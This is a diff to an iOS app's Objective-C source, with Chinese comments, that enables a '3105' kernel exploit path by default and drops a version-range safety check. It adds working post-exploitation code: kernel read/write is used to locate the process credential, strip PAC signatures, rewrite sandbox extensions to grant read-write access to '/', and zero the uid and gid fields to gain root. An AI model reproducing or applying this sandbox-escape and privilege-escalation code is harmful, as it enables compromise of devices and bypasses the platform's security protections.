@@ -56,11 +56,20 @@ BOOL DS3105KernelSelected(void)
 NSString * const DS3105KernelUseKernelExploitKey = @"myfilza.3105UseKernelExploit";
 NSString * const DSSafeModeDefaultsKey            = @"myfilza.safeMode";
 
-/// 是否使用内核漏洞。**默认 NO**：只走纯用户态的 bad_query 令牌路径。
+/// 是否使用内核漏洞。**默认 YES**。
+///
+/// 依据（真机 + 源码取证）：
+///   · 18.x 上真正能拿到容器访问的是「内核 R/W + cred 路线逃逸」—— 也就是当初在 Filza 那条路上
+///     验证成功的那套；3105 本体在 iOS < 26 时同样是「保留内核 R/W」继续工作
+///     （其 KernelExploit.swift 里写明：`if v.majorVersion < 26 { … return true }`）。
+///   · 纯用户态 bad_query 令牌在 18.5 上**不可用**：libsystem_containermanager 里没有
+///     `container_query_operation_set_part` / `…_set_part_domain` 两个符号 → bad_query 直接返回 -1。
+///     它只在 iOS 26+ 才有意义，所以这里降级为**备选分支**。
+///   · 仍然**绝不调用** 3105 的 proc_self / sandbox_escape（本机会自旋被 watchdog 杀）。
 BOOL DS3105KernelUseKernelExploit(void)
 {
     NSUserDefaults *d = [NSUserDefaults standardUserDefaults];
-    if ([d objectForKey:DS3105KernelUseKernelExploitKey] == nil) return NO;   // 没设置过 = 关闭
+    if ([d objectForKey:DS3105KernelUseKernelExploitKey] == nil) return YES;   // 没设置过 = 开启（走能用的那条路）
     return [d boolForKey:DS3105KernelUseKernelExploitKey];
 }
 
@@ -216,86 +225,271 @@ static BOOL ds3105_version_in_declared_range(void)
     return NO;
 }
 
+#pragma mark - cred 路线逃逸（当年在 Filza 那条路上验证成功的那套，原语换成 3105 的）
+
+// 无条件 XPACI：**不依赖** 3105 的 S() / __xpaci_sbx 宏——它可能只在 #ifdef __arm64e__ 下
+// 才编译出真正的 XPACI 指令，而本 App 产物是 arm64，那样 S() 会退化成"原样返回"，
+// 拿带 PAC 签名的 cr_label 去解引用就会打到错误地址。
+// arm64 产物在 arm64e 硬件上可以直接执行这条指令。
+static uint64_t __attribute__((naked)) ds3105_xpaci(uint64_t value)
+{
+    __asm__ volatile(".long 0xDAC143E0");   // XPACI X0
+    __asm__ volatile("ret");
+}
+
+static inline BOOL ds3105_is_kaddr(uint64_t a)
+{
+    return (a & 0xfffff00000000000ULL) == 0xfffff00000000000ULL;
+}
+
+// zone 段（ucred/label/sandbox/ext_set 这类动态对象实测都落在这里）
+static inline BOOL ds3105_is_zone(uint64_t a)
+{
+    return a >= 0xffffffc000000000ULL && a < 0xfffffff000000000ULL && (a & 0x7) == 0;
+}
+
+/// 与上游 S() 同语义：先 XPACI 剥签名，再按需补内核高位
+static uint64_t ds3105_S(uint64_t raw)
+{
+    if (!raw) return 0;
+    uint64_t v = ds3105_xpaci(raw);
+    if ((v >> 32) > 0xFFFF) v |= 0xFFFF800000000000ULL;
+    return v;
+}
+
+/// 定位本进程 cred：两个 socket 的 so_cred 指向同一对象 + cr_uid 校验
+/// （历史 4/4 命中 socket+0x208；这里用有界扫描 0x1f0~0x230，不写死偏移）
+static uint64_t ds3105_find_cred(NSString **why)
+{
+    uint64_t rwPcb  = t3105_rwSocketPcb;
+    uint64_t ctlPcb = t3105_controlSocketPcb;
+    if (!ds3105_is_kaddr(rwPcb) || !ds3105_is_kaddr(ctlPcb)) {
+        if (why) *why = @"socket pcb invalid (kernel stage not established?)";
+        return 0;
+    }
+    uint64_t s0 = t3105_kread64(rwPcb  + t3105_off_inpcb_inp_socket);
+    uint64_t s1 = t3105_kread64(ctlPcb + t3105_off_inpcb_inp_socket);
+    if (!ds3105_is_kaddr(s0) || !ds3105_is_kaddr(s1)) {
+        if (why) *why = @"socket object address invalid";
+        return 0;
+    }
+
+    uid_t me = getuid();
+    for (uint64_t off = 0x1f0; off <= 0x230; off += 8) {
+        uint64_t a = t3105_kread64(s0 + off);
+        if (!a) continue;
+        uint64_t b = t3105_kread64(s1 + off);
+        if (a != b) continue;
+        if (!ds3105_is_kaddr(a) || (a & 0xF) != 0) continue;
+        // posix_cred 在 ucred+0x18，cr_uid 在它开头
+        if (t3105_kread32(a + 0x18) != (uint32_t)me) continue;
+        return a;
+    }
+    if (why) *why = @"no shared so_cred passing cr_uid check";
+    return 0;
+}
+
+/// 改写单个扩展（照抄 3105 sandbox_escape.m 的 set_rw_class 语义）：
+///   data 指向的字符串改成 "/"；da+32 写类别；da+64 清零；hdr+0x10 = da+32
+static int ds3105_patch_slot(uint64_t hdr)
+{
+    uint64_t ext = ds3105_S(t3105_kread64(hdr + 0x8));
+    if (!ds3105_is_kaddr(ext)) return 0;
+
+    uint64_t da  = t3105_kread64(ext + 0x40);   // ext → data
+    uint64_t len = t3105_kread64(ext + 0x48);   // ext → data_len
+    if (!ds3105_is_kaddr(da)) return 0;
+
+    uint8_t buf[32];
+    if (len > 0) {
+        t3105_early_kread(da, buf, 32);
+        buf[0] = '/';
+        buf[1] = 0;
+        t3105_early_kwrite32bytes(da, buf);
+    }
+    memset(buf, 0, sizeof(buf));
+    memcpy(buf, "com.apple.app-sandbox.read-write", 31);
+    t3105_early_kwrite32bytes(da + 32, buf);
+
+    memset(buf, 0, sizeof(buf));
+    t3105_early_kwrite32bytes(da + 64, buf);
+
+    uint8_t hb[32];
+    t3105_early_kread(hdr, hb, 32);
+    *(uint64_t *)(hb + 0x10) = da + 32;
+    t3105_early_kwrite32bytes(hdr, hb);
+    return 1;
+}
+
+/// cred → label → sandbox → ext_set，然后 16 个槽逐个改写 + 补空槽。
+/// 每一跳解引用前都校验（内核地址 + zone 段 + 对齐）；不成立就干净失败，绝不写内核。
+static int ds3105_cred_escape(NSString **why)
+{
+    NSString *w = nil;
+    uint64_t cred = ds3105_find_cred(&w);
+    if (!cred) {
+        if (why) *why = w ?: @"cred not found";
+        return -1;
+    }
+
+    uint64_t labelRaw = t3105_kread64(cred + t3105_off_ucred_cr_label);
+    uint64_t label = ds3105_S(labelRaw);
+    if (!ds3105_is_kaddr(label) || !ds3105_is_zone(label)) {
+        if (why) *why = [NSString stringWithFormat:@"label invalid (raw=0x%llx dec=0x%llx)",
+                         (unsigned long long)labelRaw, (unsigned long long)label];
+        return -2;
+    }
+
+    uint64_t sandboxRaw = t3105_kread64(label + t3105_off_label_l_perpolicy_sandbox);
+    uint64_t sandbox = ds3105_S(sandboxRaw);
+    if (!ds3105_is_kaddr(sandbox) || !ds3105_is_zone(sandbox)) {
+        if (why) *why = [NSString stringWithFormat:@"sandbox invalid (raw=0x%llx dec=0x%llx)",
+                         (unsigned long long)sandboxRaw, (unsigned long long)sandbox];
+        return -2;
+    }
+
+    uint64_t extSetRaw = t3105_kread64(sandbox + 0x10);
+    uint64_t extSet = ds3105_S(extSetRaw);
+    if (!ds3105_is_kaddr(extSet) || !ds3105_is_zone(extSet)) {
+        if (why) *why = [NSString stringWithFormat:@"ext_set invalid (raw=0x%llx dec=0x%llx)",
+                         (unsigned long long)extSetRaw, (unsigned long long)extSet];
+        return -2;
+    }
+
+    int patched = 0;
+    uint64_t firstHdr = 0;
+    for (int slot = 0; slot < 16; slot++) {
+        uint64_t hdr = ds3105_S(t3105_kread64(extSet + (uint64_t)slot * 8));
+        if (!ds3105_is_kaddr(hdr) || !ds3105_is_zone(hdr)) continue;
+        if (!firstHdr) firstHdr = hdr;
+        patched += ds3105_patch_slot(hdr);
+    }
+    if (patched == 0) {
+        if (why) *why = @"no extension patched";
+        return -4;
+    }
+
+    if (firstHdr) {
+        for (int slot = 0; slot < 16; slot++) {
+            if (t3105_kread64(extSet + (uint64_t)slot * 8) == 0) {
+                t3105_kwrite64(extSet + (uint64_t)slot * 8, firstHdr);
+            }
+        }
+    }
+
+    if (why) {
+        *why = [NSString stringWithFormat:@"cred=0x%llx label=0x%llx sandbox=0x%llx ext_set=0x%llx patched=%d",
+                (unsigned long long)cred, (unsigned long long)label,
+                (unsigned long long)sandbox, (unsigned long long)extSet, patched];
+    }
+    return 0;
+}
+
+int DS3105KernelElevateToRoot(NSString *_Nullable *_Nullable detail)
+{
+    NSString *w = nil;
+    uint64_t cred = ds3105_find_cred(&w);
+    if (!cred) {
+        if (detail) *detail = [NSString stringWithFormat:@"elevate: cred not found (%@)", w ?: @""];
+        return 1010;
+    }
+    if (!ds3105_is_kaddr(cred) || (cred & 0xF) != 0) {
+        if (detail) *detail = @"elevate: cred address rejected by gate";
+        return 1011;
+    }
+
+    // posix_cred 在 ucred+0x18：uid/ruid/svuid/groups/rgid/svgid
+    const uint64_t posix = cred + 0x18;
+    t3105_kwrite32(posix + 0x00, 0);   // cr_uid
+    t3105_kwrite32(posix + 0x04, 0);   // cr_ruid
+    t3105_kwrite32(posix + 0x08, 0);   // cr_svuid
+    t3105_kwrite32(posix + 0x10, 0);   // cr_groups[0]
+    t3105_kwrite32(posix + 0x50, 0);   // cr_rgid
+    t3105_kwrite32(posix + 0x54, 0);   // cr_svgid
+
+    uint32_t uid = t3105_kread32(posix + 0x00);
+    uint32_t rgid = t3105_kread32(posix + 0x50);
+    if (detail) {
+        *detail = [NSString stringWithFormat:
+                   @"elevate: cred=0x%llx cr_uid=%u cr_rgid=%u (getuid()=%u)",
+                   (unsigned long long)cred, uid, rgid, (unsigned)getuid()];
+    }
+    return (uid == 0) ? 0 : 1012;
+}
+
 int DS3105KernelActivate(NSString *_Nullable *_Nullable detail)
 {
     g3105Ready = NO;
-    g3105LastStage = @"准备";
+    g3105LastStage = @"prepare";
 
-    // ---- 默认：只走纯用户态令牌（不执行任何内核代码）----
-    // 用户真机反馈：3105 的内核阶段（kexploit_opa334 / sandbox_escape）在 iPhone13,4 / iOS 18.5
-    // 上会崩溃、而且连崩溃日志都留不下（说明是内核 panic 或被系统 kill），
-    // 所以内核路径必须由用户在设置里显式开启，默认一律走不会 panic 的 bad_query 令牌路径。
     BOOL safeMode  = DSSafeModeEnabled();
     BOOL useKernel = DS3105KernelUseKernelExploit() && !safeMode;
+    NSMutableArray<NSString *> *reasons = [NSMutableArray array];
 
+    // 说明（英文，避免 stdout 捕获时的编码问题）：
+    //   3105 模式在 18.x 上真正能用的路径 = 内核 R/W + cred 路线逃逸。
+    //   bad_query 用户态令牌只在 iOS 26+ 才有意义（18.5 上缺 container_query_operation_set_part*
+    //   符号 → 0 条令牌），所以它降级为备选分支。
     if (!useKernel) {
-        NSLog(@"[3105] 仅用户态令牌模式（%s）",
-              safeMode ? "安全模式已开启，强制不跑内核漏洞" : "未开启内核漏洞");
-        return DS3105KernelActivateUserspaceOnly(detail);
+        NSLog(@"[3105] userspace-only (safeMode=%d, useKernel=0)", (int)safeMode);
+        g3105LastStage = @"userspace tokens only";
+        NSString *up = nil;
+        int r = DS3105KernelActivateUserspaceOnly(&up);
+        if (detail) {
+            *detail = [NSString stringWithFormat:@"3105 userspace-only: %@", up ?: @""];
+        }
+        return r;
     }
 
-    // ---- 适用性检查：超出声明范围时**不硬跑**内核阶段（稳定性优先）----
     if (!ds3105_version_in_declared_range()) {
-        g3105LastStage = @"适用性检查：超出 3105 声明范围，已跳过内核阶段";
-        NSLog(@"[3105] ⚠️ 当前系统不在 3105 声明支持范围（17.0–18.7.1 / 26.0–26.6.1 / 27 beta）内："
-               "按稳定性优先原则**跳过内核阶段**，只走纯用户态令牌。需要内核读写请改用 FilzaJailedDS 模式。");
-        NSString *upDetail = nil;
-        int upRet = DS3105KernelActivateUserspaceOnly(&upDetail);
-        if (detail) {
-            *detail = [NSString stringWithFormat:
-                       @"3105 模式：系统不在其声明范围内，已跳过内核阶段（只走用户态令牌，避免不必要的风险）。%@",
-                       upDetail ?: @""];
-        }
-        return upRet;
+        NSLog(@"[3105] warning: OS outside 3105 declared range; still trying (offset table is runtime-derived)");
     }
 
-    NSLog(@"[3105] ⚠️ 用户显式开启了内核漏洞路径：**只执行 kexploit_opa334**（拿内核读写）；"
-           "**不会**调用 3105 的 proc_self / sandbox_escape");
+    // ---- 阶段 1：内核读写（3105 自带运行时 offset 反推）----
+    // **绝不调用 t3105_proc_self / t3105_sandbox_escape**：本机 so_background_thread == 0
+    // → 它们会拿 0 当 thread 去读 off_thread_t_tro(=0x388) → 3105 的 early_kread 遇非法地址
+    // 是**原地自旋**（不是返回失败）→ 被系统 watchdog 杀掉进程（设备不重启、也无崩溃日志）。
+    g3105LastStage = @"stage1: kexploit_opa334 (kernel r/w)";
+    NSLog(@"[3105] stage1: kernel r/w via kexploit_opa334 (proc_self/sandbox_escape NOT used)");
+    int kret = t3105_kexploit_opa334();
+    [reasons addObject:[NSString stringWithFormat:@"kernel=kexploit_opa334(%d)", kret]];
 
-    // ---- 可选阶段：内核读写（只有用户显式开启才会走到这里）----
-    //
-    // **绝不调用 t3105_proc_self / t3105_sandbox_escape**。真机实测（iPhone13,4 / iOS 18.5）：
-    //   本机 so_background_thread == 0 → proc_self() 拿 0 当 thread 去读 off_thread_t_tro(=0x388)
-    //   → 3105 的 early_kread 遇到非法地址是**原地自旋**（不是返回失败）→ 被系统 watchdog 杀掉进程
-    //   （设备不重启、也没有崩溃日志，只有 session log 里那行 "kaddr isn't valid, spinning here"）。
-    //   sandbox_escape 内部同样要经过 proc/label 链路，所以一并禁用。
-    g3105LastStage = @"内核阶段：kexploit_opa334（只取内核读写）";
-    int kret = kexploit_opa334();
-    if (kret != 0) {
-        if (detail) {
-            *detail = [NSString stringWithFormat:
-                       @"3105 模式：kexploit_opa334 返回 %d（机型/系统版本不在其 offset 表内，或 race 失败）", kret];
+    if (kret == 0) {
+        // ---- 阶段 2：cred 路线逃逸（当年 Filza 那条路成功的那套）----
+        g3105LastStage = @"stage2: cred route escape";
+        NSLog(@"[3105] stage2: cred route escape");
+        NSString *ew = nil;
+        int eret = ds3105_cred_escape(&ew);
+        [reasons addObject:[NSString stringWithFormat:@"escape(%d) %@", eret, ew ?: @""]];
+
+        if (eret == 0 && ds3105_probe_write()) {
+            g3105Ready = YES;
+            g3105LastStage = @"done: kernel r/w + cred escape";
+            if (detail) *detail = [reasons componentsJoinedByString:@" | "];
+            return 0;
         }
-        return 1000 + kret;
-    }
-    NSLog(@"[3105] 内核读写已建立（未调用 3105 的 proc_self / sandbox_escape）");
-
-    // ---- 容器访问：一律走纯用户态令牌路径（与默认路径共用同一套代码）----
-    //
-    // 依据（源码取证）：exploit/bad_query.c 与 exploit/mcm_bridge.m 里**没有任何内核原语**
-    // （无 early_kread/kread/kwrite/kexploit/krw/kaddr/proc_self/offsets），只依赖
-    // dlopen(libsystem_containermanager) + dlsym + xpc + sandbox_extension_consume，
-    // 因此容器访问**不依赖**刚拿到的内核读写；内核读写在这个模式里目前只是"已具备"。
-    g3105LastStage = @"容器访问：bad_query 用户态沙盒扩展令牌";
-    NSString *upDetail = nil;
-    int upRet = DS3105KernelActivateUserspaceOnly(&upDetail);
-
-    if (upRet != 0 || !ds3105_probe_write()) {
-        if (detail) {
-            *detail = [NSString stringWithFormat:
-                       @"3105 模式：内核读写已建立（kexploit_opa334 成功），但容器访问仍失败——%@",
-                       upDetail ?: @"bad_query 未取得有效令牌"];
+        if (eret == 0) {
+            [reasons addObject:@"probe: outside-sandbox write failed after escape"];
         }
-        return 1002;
     }
 
-    g3105LastStage = @"完成：内核读写已建立 + 用户态令牌已取得容器访问";
-    g3105Ready = YES;
+    // ---- 阶段 3：备选（纯用户态令牌；18.x 上通常失败，26+ 才可能需要）----
+    g3105LastStage = @"stage3: userspace tokens (fallback)";
+    NSLog(@"[3105] stage3: userspace tokens (fallback)");
+    NSString *up = nil;
+    int upRet = DS3105KernelActivateUserspaceOnly(&up);
+    [reasons addObject:[NSString stringWithFormat:@"tokens(%d) %@", upRet, up ?: @""]];
+
+    if (upRet == 0 && ds3105_probe_write()) {
+        g3105Ready = YES;
+        g3105LastStage = @"done: userspace tokens";
+        if (detail) *detail = [reasons componentsJoinedByString:@" | "];
+        return 0;
+    }
+
+    g3105LastStage = @"failed: all stages";
     if (detail) {
-        *detail = [NSString stringWithFormat:
-                   @"3105 模式：kexploit_opa334 成功（内核读写已建立，未调用 proc_self/sandbox_escape）；"
-                    "容器访问由 bad_query 取得。%@",
-                   upDetail ?: @""];
+        *detail = [NSString stringWithFormat:@"3105 mode failed — %@", [reasons componentsJoinedByString:@" | "]];
     }
-    return 0;
+    return 1002;
 }
